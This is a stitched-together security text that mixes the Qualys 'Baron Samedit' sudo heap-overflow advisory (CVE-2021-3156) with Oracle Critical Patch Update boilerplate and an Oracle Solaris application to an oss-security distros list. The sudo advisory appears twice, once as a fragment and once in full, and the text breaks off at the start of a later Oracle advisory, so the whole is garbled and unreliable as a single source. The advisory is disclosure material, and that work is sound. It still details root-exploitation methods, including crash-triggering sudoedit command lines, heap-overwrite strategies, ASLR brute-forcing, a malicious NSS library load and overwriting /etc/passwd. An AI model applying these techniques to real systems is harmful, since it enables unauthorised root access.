3a/ either chown() this arbitrary file to user root and group root;

3b/ or open (or create) this arbitrary file as root, and write a struct
timestamp_entry to it.

We were unable to transform 3a/ into full root privileges (for example,
if we chown() our own SUID binary to root, then the kernel automatically
removes our binary's SUID bit). If you, dear reader, find a solution to
this problem, please post it to the public oss-security mailing list!

Eventually, we were able to transform 3b/ into full root privileges, but
we initially faced two problems:

- Sudo's timestamp_open() deletes our arbitrary symlink if the file it
  points to is older than boot time. We were able to solve this first
  problem by creating a very old timestamp file (from the Unix epoch),
  by waiting until timestamp_open() deletes it, and by racing against
  timestamp_open() to create our final, arbitrary symlink.

- We do not control the contents of the struct timestamp_entry that is
  written to the arbitrary file. To the best of our knowledge, we only
  control three bytes (a process ID or a struct timespec), and we were
  unable to transform this three-byte write into full root privileges.
  If you, dear reader, find a solution to this problem, please post it
  to the public oss-security mailing list!

However, we were able to circumvent this second problem by abusing a
minor bug in Sudo's timestamp_lock(). If we win the two races against
ts_mkdirs() and timestamp_open(), and if our arbitrary symlink points to
/etc/passwd, then this file is opened as root, and:

------------------------------------------------------------------------
 65 struct timestamp_entry {
 66     unsigned short version;     /* version number */
 67     unsigned short size;        /* entry size */
 68     unsigned short type;        /* TS_GLOBAL, TS_TTY, TS_PPID */
 ..
 78 };
------------------------------------------------------------------------
 305 static ssize_t
 306 ts_write(int fd, const char *fname, struct timestamp_entry *entry, off_t offset)
 307 {
 ...
 318         nwritten = pwrite(fd, entry, entry->size, offset);
 ...
 350 }
------------------------------------------------------------------------
 619 bool
 620 timestamp_lock(void *vcookie, struct passwd *pw)
 621 {
 622     struct ts_cookie *cookie = vcookie;
 623     struct timestamp_entry entry;
 ...
 644     nread = read(cookie->fd, &entry, sizeof(entry));
 645     if (nread == 0) {
 ...
 652     } else if (entry.type != TS_LOCKEXCL) {
 ...
 657         if (ts_write(cookie->fd, cookie->fname, &entry, 0) == -1)
------------------------------------------------------------------------

- at line 644, the first 0x38 bytes of /etc/passwd ("root:x:0:0:...")
  are read into a stack-based struct timestamp_entry, entry;

- at line 652, entry.type is 0x783a (":x"), not TS_LOCKEXCL;

- at lines 657 and 318, entry->size bytes from the stack-based entry are
  written to /etc/passwd, but entry->size is actually 0x746f ("ot"), not
  sizeof(struct timestamp_entry).

As a result, we write the entire contents of Sudo's stack to /etc/passwd
(including our command-line arguments and our environment variables): we
inject an arbitrary user into /etc/passwd and therefore obtain full root
privileges. We successfully tested this third exploit on Ubuntu 20.04.

Note: this minor bug in timestamp_lock() was fixed in January 2020 by
commit 586b418a, but this fix was not backported to legacy versions.

## Oracle Critical Patch Update Advisory - October 2021

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 419 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [October 2021 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2809080.1).

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security fixes and detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuoct2021verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 38 new security patches for Oracle Fusion Middleware.  30 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuoct2021verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update October 2021 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update October 2021 Patch Availability Document for Oracle Products, [My Oracle Support Note 2796575.1](https://support.oracle.com/rs?type=doc&id=2796575.1).

No worries - I figured it was that time of year, and this isn't something

That seems like something we could help with.  I also note that there are
many vulnerabilities we discover in the FOSS packages we ship that never
make it to this list - when the researchers or project maintainers don't
send notices to oss-security, should folks like us at least give a heads
up here?

One obvious one in the last week was the highly publicized Ghostscript
"0 day" - aka CVE-2021-3781, for which the upstream bug report is at
<https://bugs.ghostscript.com/show_bug.cgi?id=704342> and media report at
<https://therecord.media/ghostscript-zero-day-allows-full-server-compromises>
(and yes, as noted in the above quote, an actual report to the list
  needs more details than just these url's).

Of course, we ship a smaller subset of FOSS than most Linux distros do,
so we won't spot everything, but can help contribute to a larger effort.

For the eligibility criteria:

Oracle Solaris 11.4 is the latest version of an unbroken chain going back
over 35 years through Oracle & Sun Solaris releases, and SunOS before that.
Updates are posted monthly to our support repositories, as reported in our
public blog at <https://blogs.oracle.com/solaris/> and interim relief is
provided to support customers between those releases.

While our kernel and many core OS components are closed source, the majority
of packages in our package repository are external Open Source.  A list of
the over 1000 open source components shipped in the Solaris 11.4 release in
August 2018 is at:
<https://docs.oracle.com/cd/E37838_01/html/E61065/osplg-tparty.html>

Current build recipes for most of the FOSS packages we ship in current updates
can be found at <https://github.com/oracle/solaris-userland/> or in the FOSS
source release archives at:
<https://objectstorage.us-phoenix-1.oraclecloud.com/n/solarisx86/b/opensource/o/sol-11_4_37_101_1-opensource_1.zip>
<https://objectstorage.us-phoenix-1.oraclecloud.com/n/solarisx86/b/opensource/o/sol-11_4_37_101_1-opensource_2.zip>

<https://objectstorage.us-phoenix-1.oraclecloud.com/n/solarisx86/b/opensource/o/sol-11_4_37_101_1-opensource.digest.txt>
(Those zip files primarily bundle in the external source archives that are
  just referenced in the github repo, providing a permanent copy of the code
  should the upstream download URL's stop working at some point.)

The Solaris organization has a track record going back decades for fixing
security issues, as seen on:
<https://www.oracle.com/security-alerts/sunalertslisting.html>
<https://www.oracle.com/security-alerts/#SolarisThirdPartyBulletin>

As for timeliness:

We learned about CVE-2021-3156 in sudo from the oss-security posting on
January 26, 2021 and made interim relief available to customers on January 28.

We learned about CVE-2020-1971 in OpenSSL from the public disclosure on
December 8, 2020, and made interim relief available to customers on December 16.

We learned about CVE-2019-14287 in sudo from the oss-security posting on
October 14, 2019, and made interim relief available to customers on October 22.

Solaris is different enough that we can't rely on another distro and must
maintain our own package sets.  There are Oracle products downstream of us
who would be releasing fixes for their product using our work - these include
the ZFS Storage Appliance, SPARC SuperCluster, and MiniCluster.

I have been a member of oss-security since at least 2013, acting as both a
distro maintainer and as a representative of the X.Org upstream security team:
<https://marc.info/?l=oss-security&w=4&r=1&s=Coopersmith&q=b>

Casper has similarly been participating in oss-security for years, and earlier
lists such as bugtraq for decades, while Pavel has been monitoring oss-security
for issues we need to address in our packages.

We accept the policies as currently stated on

See previous discussion.

We are, and will provide PGP keys.

See previous discussion.  As well, in preparing this, John Haxby agreed to
vouch for Casper & I, and Ritwik Ghoshal agreed to vouch for all three of us.

Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)

========================================================================

========================================================================
Summary
========================================================================

We discovered a heap-based buffer overflow in Sudo
(<https://www.sudo.ws/>). This vulnerability:

- is exploitable by any local user (normal users and system users,
  sudoers and non-sudoers), without authentication (i.e., the attacker
  does not need to know the user's password);

- was introduced in July 2011 (commit 8255ed69), and affects all legacy
  versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to
  1.9.5p1, in their default configuration.

We developed three different exploits for this vulnerability, and
obtained full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10
(Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and
distributions are probably also exploitable.

========================================================================
Analysis
========================================================================

If Sudo is executed to run a command in "shell" mode (shell -c command):

- either through the -s option, which sets Sudo's MODE_SHELL flag;

- or through the -i option, which sets Sudo's MODE_SHELL and
  MODE_LOGIN_SHELL flags;

then, at the beginning of Sudo's main(), parse_args() rewrites argv
(lines 609-617), by concatenating all command-line arguments (lines
587-595) and by escaping all meta-characters with backslashes (lines
590-591):

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
572         char **av, *cmnd = NULL;
573         int ac = 1;
...
581             cmnd = dst = reallocarray(NULL, cmnd_size, 2);
...
587             for (av = argv; *av != NULL; av++) {
588                 for (src = *av; *src != '\0'; src++) {
589                     /* quote potential meta characters */
590                     if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
591                         *dst++ = '\\';
592                     *dst++ = *src;
593                 }
594                 *dst++ = ' ';
595             }
...
600             ac += 2; /* -c cmnd */
...
603         av = reallocarray(NULL, ac + 1, sizeof(char *));
...
609         av[0] = (char *)user_details.shell; /* plugin may override shell */
610         if (cmnd != NULL) {
611             av[1] = "-c";
612             av[2] = cmnd;
613         }
614         av[ac] = NULL;
615
616         argv = av;
617         argc = ac;
618     }
------------------------------------------------------------------------

Later, in sudoers_policy_main(), set_cmnd() concatenates the
command-line arguments into a heap-based buffer "user_args" (lines
864-871) and unescapes the meta-characters (lines 866-867), "for sudoers
matching and logging purposes":

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 852             for (size = 0, av = NewArgv + 1; *av; av++)
 853                 size += strlen(*av) + 1;
 854             if (size == 0 || (user_args = malloc(size)) == NULL) {
 ...
 857             }
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
 ...
 864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
 865                     while (*from) {
 866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
 867                             from++;
 868                         *to++ = *from++;
 869                     }
 870                     *to++ = ' ';
 871                 }
 ...
 884             }
 ...
 886     }
------------------------------------------------------------------------

Unfortunately, if a command-line argument ends with a single backslash
character, then:

- at line 866, "from[0]" is the backslash character, and "from[1]" is
  the argument's null terminator (i.e., not a space character);

- at line 867, "from" is incremented and points to the null terminator;

- at line 868, the null terminator is copied to the "user_args" buffer,
  and "from" is incremented again and points to the first character
  after the null terminator (i.e., out of the argument's bounds);

- the "while" loop at lines 865-869 reads and copies out-of-bounds
  characters to the "user_args" buffer.

In other words, set_cmnd() is vulnerable to a heap-based buffer
overflow, because the out-of-bounds characters that are copied to the
"user_args" buffer were not included in its size (calculated at lines
852-853).

In theory, however, no command-line argument can end with a single
backslash character: if MODE_SHELL or MODE_LOGIN_SHELL is set (line 858,
a necessary condition for reaching the vulnerable code), then MODE_SHELL
is set (line 571) and parse_args() already escaped all meta-characters,
including backslashes (i.e., it escaped every single backslash with a
second backslash).

In practice, however, the vulnerable code in set_cmnd() and the escape
code in parse_args() are surrounded by slightly different conditions:

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
------------------------------------------------------------------------

versus:

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
------------------------------------------------------------------------

Our question, then, is: can we set MODE_SHELL and either MODE_EDIT or
MODE_CHECK (to reach the vulnerable code) but not the default MODE_RUN
(to avoid the escape code)?

The answer, it seems, is no: if we set MODE_EDIT (-e option, line 361)
or MODE_CHECK (-l option, lines 423 and 519), then parse_args() removes
MODE_SHELL from the "valid_flags" (lines 363 and 424) and exits with an
error if we specify an invalid flag such as MODE_SHELL (lines 532-533):

------------------------------------------------------------------------
358                 case 'e':
...
361                     mode = MODE_EDIT;
362                     sudo_settings[ARG_SUDOEDIT].value = "true";
363                     valid_flags = MODE_NONINTERACTIVE;
364                     break;
...
416                 case 'l':
...
423                     mode = MODE_LIST;
424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
425                     break;
...
518     if (argc > 0 && mode == MODE_LIST)
519         mode = MODE_CHECK;
...
532     if ((flags & valid_flags) != flags)
533         usage(1);
------------------------------------------------------------------------

But we found a loophole: if we execute Sudo as "sudoedit" instead of
"sudo", then parse_args() automatically sets MODE_EDIT (line 270) but
does not reset "valid_flags", and the "valid_flags" include MODE_SHELL
by default (lines 127 and 249):

------------------------------------------------------------------------
127 #define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
...
249     int valid_flags = DEFAULT_VALID_FLAGS;
...
267     proglen = strlen(progname);
268     if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
269         progname = "sudoedit";
270         mode = MODE_EDIT;
271         sudo_settings[ARG_SUDOEDIT].value = "true";
272     }
------------------------------------------------------------------------

Consequently, if we execute "sudoedit -s", then we set both MODE_EDIT
and MODE_SHELL (but not MODE_RUN), we avoid the escape code, reach the
vulnerable code, and overflow the heap-based buffer "user_args" through
a command-line argument that ends with a single backslash character:

------------------------------------------------------------------------
sudoedit -s '\' `perl -e 'print "A" x 65536'`
malloc(): corrupted top size
Aborted (core dumped)
------------------------------------------------------------------------

From an attacker's point of view, this buffer overflow is ideal:

- we control the size of the "user_args" buffer that we overflow (the
  size of our concatenated command-line arguments, at lines 852-854);

- we independently control the size and contents of the overflow itself
  (our last command-line argument is conveniently followed by our first
  environment variables, which are not included in the size calculation
  at lines 852-853);

- we can even write null bytes to the buffer that we overflow (every
  command-line argument or environment variable that ends with a single
  backslash writes a null byte to "user_args", at lines 866-868).

For example, on an amd64 Linux, the following command allocates a
24-byte "user_args" buffer (a 32-byte heap chunk) and overwrites the
next chunk's size field with "A=a\0B=b\0" (0x00623d4200613d41), its fd
field with "C=c\0D=d\0" (0x00643d4400633d43), and its bk field with
"E=e\0F=f\0" (0x00663d4600653d45):

------------------------------------------------------------------------
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'

Because Sudo calls localization functions at the very beginning of its
main() function:

------------------------------------------------------------------------
 154     setlocale(LC_ALL, "");
 155     bindtextdomain(PACKAGE_NAME, LOCALEDIR);
 156     textdomain(PACKAGE_NAME);
------------------------------------------------------------------------

and passes translation strings (through the gettext() function and _()
macro) to format-string functions such as:

------------------------------------------------------------------------
 301             sudo_printf(SUDO_CONV_ERROR_MSG, _("%s is not in the sudoers "
 302                 "file.  This incident will be reported.\n"), user_name);
------------------------------------------------------------------------

we initially wanted to reuse halfdog's fascinating technique from
<https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/> and
transform Sudo's heap-based buffer overflow into a format-string
exploit. More precisely:

- at line 154, in setlocale(), we malloc()ate and free() several LC
  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby
  creating small holes at the very beginning of Sudo's heap (free fast
  or tcache chunks);

- at line 155, bindtextdomain() malloc()ates a struct binding, which
  contains a dirname pointer to the name of a directory that contains
  ".mo" catalog files and hence translation strings;

- in set_cmnd(), we malloc()ate the "user_args" buffer into one of the
  holes at the beginning of Sudo's heap, and overflow this buffer, thus
  overwriting the struct binding's dirname pointer;

- at line 301 (for example), gettext() (through the _() macro) loads our
  own translation string from the overwritten dirname -- in other words,
  we control the format string that is passed to sudo_printf().

To implement this initial technique, we wrote a rudimentary brute-forcer
that executes Sudo inside gdb, overflows the "user_args" buffer, and
randomly selects the following parameters:

- the LC environment variables that we pass to Sudo, and their length
  (we use the "C.UTF-8" locale and append a random "@modifier");

- the size of the "user_args" buffer that we overflow;

- the size of the overflow itself;

- whether we go through Sudo's authentication code (-A or -n option) or
  not (-u #realuid option).

Unfortunately, this initial technique failed; our brute-forcer was able
to overwrite the struct binding's dirname pointer:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6e0dde1ea9 in __dcigettext (domainname=domainname@...ry=0x7f6e0d9cc020 "sudoers", msgid1=msgid1@...ry=0x7f6e0d9cc014 "user NOT in sudoers", msgid2=msgid2@...ry=0x0, plural=plural@...ry=0, n=n@...ry=0, category=5) at dcigettext.c:619

=> 0x7f6e0dde1ea9 <__dcigettext+1257>:  cmpb   $0x2f,(%rax)

rax            0x4141414141414141  4702111234474983745
------------------------------------------------------------------------

but LC_MESSAGES was always the default "C" locale (not "C.UTF-8"), which
disables the string translation in gettext() (i.e., gettext() returns
the original format string, not our own).

Fortunately, however, our brute-forcer produced dozens of unique Sudo
crashes and gdb backtraces; among these, three caught our attention, and
we eventually exploited all three.

========================================================================
1/ struct sudo_hook_entry overwrite
========================================================================

The first crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x000056291a25d502 in process_hooks_getenv (name=name@...ry=0x7f4a6d7dc046 "SYSTEMD_BYPASS_USERDB", value=value@...ry=0x7ffc595cc240) at ../../src/hooks.c:108

=> 0x56291a25d502 <process_hooks_getenv+82>:    callq  *0x8(%rbx)

rbx            0x56291c1df2b0      94734565372592

0x56291c1df2b0: 0x4141414141414141      0x4141414141414141
------------------------------------------------------------------------

Incredibly, Sudo's function process_hooks_getenv() crashed (at line 108)
because we directly overwrote a function pointer, getenv_fn (a member of
a heap-based struct sudo_hook_entry):

------------------------------------------------------------------------
 99 int
100 process_hooks_getenv(const char *name, char **value)
101 {
102     struct sudo_hook_entry *hook;
103     char *val = NULL;
...
107     SLIST_FOREACH(hook, &sudo_hook_getenv_list, entries) {
108         rc = hook->u.getenv_fn(name, &val, hook->closure);
------------------------------------------------------------------------

To exploit this struct sudo_hook_entry overwrite, we note that:

- the call to getenv_fn (at line 108) is compatible with a call to
  execve():

  . name ("SYSTEMD_BYPASS_USERDB") is compatible with execve()'s
    pathname argument;

  . &val (a pointer to a NULL pointer) is compatible with execve()'s
    argv;

  . hook->closure (a NULL pointer) is compatible with execve()'s envp;

- we can defeat ASLR by partially overwriting the function pointer
  getenv_fn (which points to the function sudoers_hook_getenv() in the
  shared library sudoers.so); and luckily, the beginning of sudoers.so
  contains a call to execve() (or execv()):

------------------------------------------------------------------------
0000000000008a00 <execv@plt>:
    8a00:       f3 0f 1e fa             endbr64
    8a04:       f2 ff 25 65 55 05 00    bnd jmpq *0x55565(%rip)        # 5df70 <execv@...BC_2.2.5>
    8a0b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
------------------------------------------------------------------------

- we can read /dev/kmsg (dmesg) as an unprivileged user on Ubuntu, and
  therefore obtain detailed information about our Sudo crashes.

Consequently, we adopt the following strategy:

- First, we brute-force the exploit parameters until we overwrite
  getenv_fn with an invalid userland address (above 0x800000000000) --
  until we observe a general protection fault at getenv_fn's call site:

------------------------------------------------------------------------
sudoedit[15904] general protection fault ip:55e9b645b502 sp:7ffe53d6fa40 error:0 in sudo[55e9b644e000+1a000]
                                                     ^^^
------------------------------------------------------------------------

- Next, we reuse these exploit parameters but overwrite getenv_fn with a
  regular pattern of valid (below 0x800000000000) but unmapped userland
  addresses -- in this example, getenv_fn is the 22nd pointer that we
  overwrite (0x32 is '2', a part of our pattern):

------------------------------------------------------------------------
sudoedit[15906]: segfault at 323230303030 ip 0000323230303030 sp 00007ffeeabf2868 error 14 in sudo[55b036c16000+5000]
                             ^^^^
------------------------------------------------------------------------

- Last, we partially overwrite getenv_fn (we overwrite its two least
  significant bytes with 0x8a00, execv()'s offset in sudoers.so, and its
  third byte with 0x00, user_args's null terminator in set_cmnd()) until
  we defeat ASLR -- we have a good chance of overwriting getenv_fn with
  the address of execv() after 2^(3*8-12) = 2^12 = 4096 tries, thus
  executing our own binary, named "SYSTEMD_BYPASS_USERDB", as root.

We successfully tested this first exploit on Ubuntu 20.04.

========================================================================
2/ struct service_user overwrite
========================================================================

The second crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6bf9c294ee in nss_load_library (ni=ni@...ry=0x55cf1a1dd040) at nsswitch.c:344

=> 0x7f6bf9c294ee <nss_load_library+46>:        cmpq   $0x0,0x8(%rbx)

rbx            0x41414141414141    18367622009667905
------------------------------------------------------------------------

The glibc's function nss_load_library() crashed (at line 344) because we
overwrote the pointer "library", a member of a heap-based struct
service_user:

------------------------------------------------------------------------
327 static int
328 nss_load_library (service_user *ni)
329 {
330   if (ni->library == NULL)
331     {
...
338       ni->library = nss_new_service (service_table ?: &default_table,
339                                      ni->name);
...
342     }
343
344   if (ni->library->lib_handle == NULL)
345     {
346       /* Load the shared library.  */
347       size_t shlen = (7 + strlen (ni->name) + 3
348                       + strlen (__nss_shlib_revision) + 1);
349       int saved_errno = errno;
350       char shlib_name[shlen];
351
352       /* Construct shared object name.  */
353       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
354                                               "libnss_"),
355                                     ni->name),
356                           ".so"),
357                 __nss_shlib_revision);
358
359       ni->library->lib_handle = __libc_dlopen (shlib_name);
------------------------------------------------------------------------

We can easily transform this struct service_user overwrite into an
arbitrary code execution:

- we overwrite ni->library with a NULL pointer, to enter the block at
  lines 330-342, avoid the crash at line 344, and enter the block at
  lines 344-359;

- we overwrite ni->name (an array of characters, initially "systemd")
  with "X/X";

- lines 353-357 construct the name of a shared library "libnss_X/X.so.2"
  (instead of "libnss_systemd.so.2");

- at line 359, we load our own shared library "libnss_X/X.so.2" from the
  current working directory and execute our _init() constructor as root.

We successfully tested this second exploit on Ubuntu 20.04, Debian 10,
and Fedora 33.

========================================================================
3/ def_timestampdir overwrite
========================================================================

Our third exploit is not derived from one of Sudo's crashes, but from a
casual observation: during our brute-force, Sudo created dozens of new
directories in our current working directory (AAAAAA, AAAAAAAAA, etc).
Each of these directories belongs to root and contains only one small
file, named after our own user: Sudo's timestamp file -- we evidently
overwrote def_timestampdir, the name of Sudo's timestamp directory.

If we overwrite def_timestampdir with the name of a directory that does
not already exist, then we can race against Sudo's ts_mkdirs(), create a
symlink to an arbitrary file, and:

3a/ either chown() this arbitrary file to user root and group root;

3b/ or open (or create) this arbitrary file as root, and write a struct
timestamp_entry to it.

We were unable to transform 3a/ into full root privileges (for example,
if we chown() our own SUID binary to root, then the kernel automatically
removes our binary's SUID bit). If you, dear reader, find a solution to
this problem, please post it to the public oss-security mailing list!

Eventually, we were able to transform 3b/ into full root privileges, but
we initially faced two problems:

- Sudo's timestamp_open() deletes our arbitrary symlink if the file it
  points to is older than boot time. We were able to solve this first
  problem by creating a very old timestamp file (from the Unix epoch),
  by waiting until timestamp_open() deletes it, and by racing against
  timestamp_open() to create our final, arbitrary symlink.

- We do not control the contents of the struct timestamp_entry that is
  written to the arbitrary file. To the best of our knowledge, we only
  control three bytes (a process ID or a struct timespec), and we were
  unable to transform this three-byte write into full root privileges.
  If you, dear reader, find a solution to this problem, please post it
  to the public oss-security mailing list!

However, we were able to circumvent this second problem by abusing a
minor bug in Sudo's timestamp_lock(). If we win the two races against
ts_mkdirs() and timestamp_open(), and if our arbitrary symlink points to
/etc/passwd, then this file is opened as root, and:

------------------------------------------------------------------------
 65 struct timestamp_entry {
 66     unsigned short version;     /* version number */
 67     unsigned short size;        /* entry size */
 68     unsigned short type;        /* TS_GLOBAL, TS_TTY, TS_PPID */
 ..
 78 };
------------------------------------------------------------------------
 305 static ssize_t
 306 ts_write(int fd, const char *fname, struct timestamp_entry *entry, off_t offset)
 307 {
 ...
 318         nwritten = pwrite(fd, entry, entry->size, offset);
 ...
 350 }
------------------------------------------------------------------------
 619 bool
 620 timestamp_lock(void *vcookie, struct passwd *pw)
 621 {
 622     struct ts_cookie *cookie = vcookie;
 623     struct timestamp_entry entry;
 ...
 644     nread = read(cookie->fd, &entry, sizeof(entry));
 645     if (nread == 0) {
 ...
 652     } else if (entry.type != TS_LOCKEXCL) {
 ...
 657         if (ts_write(cookie->fd, cookie->fname, &entry, 0) == -1)
------------------------------------------------------------------------

- at line 644, the first 0x38 bytes of /etc/passwd ("root:x:0:0:...")
  are read into a stack-based struct timestamp_entry, entry;

- at line 652, entry.type is 0x783a (":x"), not TS_LOCKEXCL;

- at lines 657 and 318, entry->size bytes from the stack-based entry are
  written to /etc/passwd, but entry->size is actually 0x746f ("ot"), not
  sizeof(struct timestamp_entry).

As a result, we write the entire contents of Sudo's stack to /etc/passwd
(including our command-line arguments and our environment variables): we
inject an arbitrary user into /etc/passwd and therefore obtain full root
privileges. We successfully tested this third exploit on Ubuntu 20.04.

Note: this minor bug in timestamp_lock() was fixed in January 2020 by
commit 586b418a, but this fix was not backported to legacy versions.

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

